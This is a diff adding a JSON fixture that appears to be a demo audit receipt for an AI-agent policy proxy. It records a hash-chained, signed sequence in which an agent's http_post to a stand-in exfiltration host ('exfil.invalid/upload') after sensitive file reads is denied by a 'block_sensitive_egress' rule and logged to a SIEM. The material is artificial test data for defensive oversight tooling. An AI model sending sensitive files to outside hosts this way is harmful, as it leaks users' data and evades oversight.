@@ -1,0 +1,108 @@
+{
+  "manifest": {
+    "bundle_id": "exec-deny-003",
+    "spec_version": "0.1",
+    "created_at": 1788000010,
+    "event_count": 6,
+    "head_hash": "9f80fc00ddf6845fd285ff8d4a8d42fc6f24c672d97882584df5ac59166654d2",
+    "policy_hash": "policy-sha256:demo",
+    "key_id": "key-79b5562e8fe654f9",
+    "algorithm": "ed25519",
+    "public_key": "79b5562e8fe654f94078b112e8a98ba7901f853ae695bed7e0e3910bad049664",
+    "signature": "7ef11b244aa25017147a65262c1bd2e7f37d8a33109796a7f415a674e384987999bb03b55cf2f55bc0e93dd61d72ec9658e6d1007119ceb8e17d2cf7ac00860e"
+  },
+  "events": [
+    {
+      "seq": 0,
+      "prev_hash": "",
+      "kind": "requested_action",
+      "timestamp": 1788000011,
+      "principal": "agent:demo",
+      "delegation": [
+        "user:mayur"
+      ],
+      "authority_ref": "policy:demo-policy#http_post",
+      "payload": {
+        "server": "net",
+        "tool": "http_post",
+        "url": "https://exfil.invalid/upload"
+      },
+      "payload_hash": "2633175a1087654c68178fb716952264b3da2a08780c29848439c3fe592ea3ee",
+      "redaction_note": "no patterns matched",
+      "evidence_source": "proxy-request",
+      "hash": "32548e4cdfc84a69ef75aeb02bb0b849981f39915e086256c429572e769276f2"
+    },
+    {
+      "seq": 1,
+      "prev_hash": "32548e4cdfc84a69ef75aeb02bb0b849981f39915e086256c429572e769276f2",
+      "kind": "policy_decision",
+      "timestamp": 1788000012,
+      "payload": {
+        "decision": "deny",
+        "rule": "block_sensitive_egress",
+        "taint": "sensitive_file_accessed"
+      },
+      "payload_hash": "663cc24c6d1c54cb503ee80c5a2a9bba14c398c55afbdedb00b2a0f7b623f8ed",
+      "evidence_source": "policy-evaluate",
+      "hash": "6ba6b108a9392e2a2e24ed6d8df57a90aa5748fdbf354e9a9376e223a73f7ecc"
+    },
+    {
+      "seq": 2,
+      "prev_hash": "6ba6b108a9392e2a2e24ed6d8df57a90aa5748fdbf354e9a9376e223a73f7ecc",
+      "kind": "runtime_attempt",
+      "timestamp": 1788000013,
+      "payload": {
+        "reason": "denied-before-relay",
+        "relayed": false
+      },
+      "payload_hash": "dbd655c68288875ad5f89fc5528340ffd404494a471f0eabae082d148f9160ae",
+      "evidence_source": "proxy-relay",
+      "hash": "bf8a8ea2d449397226dab515698c1b49e9b4e3938cb3ccc643d110d8d5594ba9"
+    },
+    {
+      "seq": 3,
+      "prev_hash": "bf8a8ea2d449397226dab515698c1b49e9b4e3938cb3ccc643d110d8d5594ba9",
+      "kind": "external_effect",
+      "timestamp": 1788000013,
+      "payload": {
+        "effect": "no egress observed",
+        "observed_calls": [
+          "file_read#100",
+          "file_read#200"
+        ]
+      },
+      "payload_hash": "95f2f95c90310d57e61c9114a5c06ee93f00c78877057cc0c7d2cbf15badc35c",
+      "confirmation": "confirmed",
+      "evidence_source": "server-observe-log",
+      "hash": "73196b2487cc44feab64279c04200480d908ef8cffe99fde663f37968f93d693"
+    },
+    {
+      "seq": 4,
+      "prev_hash": "73196b2487cc44feab64279c04200480d908ef8cffe99fde663f37968f93d693",
+      "kind": "state_delta",
+      "timestamp": 1788000014,
+      "payload": {
+        "taints_added": [
+          "sensitive_file_accessed"
+        ]
+      },
+      "payload_hash": "82ccb7c3f8346e669006819528d0dfe07ee0aef01fd81fcebbf6eba010815ce9",
+      "evidence_source": "session-state",
+      "hash": "eadafc7e67e443d798c043d0c0bdf8b29eaa3f98270cee5f03c36ef71fe38e52"
+    },
+    {
+      "seq": 5,
+      "prev_hash": "eadafc7e67e443d798c043d0c0bdf8b29eaa3f98270cee5f03c36ef71fe38e52",
+      "kind": "propagation",
+      "timestamp": 1788000015,
+      "payload": {
+        "receipt": "exec-deny-003",
+        "siem_forwarded": true
+      },
+      "payload_hash": "621b1056350748ab22cd6a247f73f770e1cb3fc5b802e4186eda76c8d139b59a",
+      "confirmation": "unconfirmed",
+      "evidence_source": "siem-exporter",
+      "hash": "9f80fc00ddf6845fd285ff8d4a8d42fc6f24c672d97882584df5ac59166654d2"
+    }
+  ]
+}
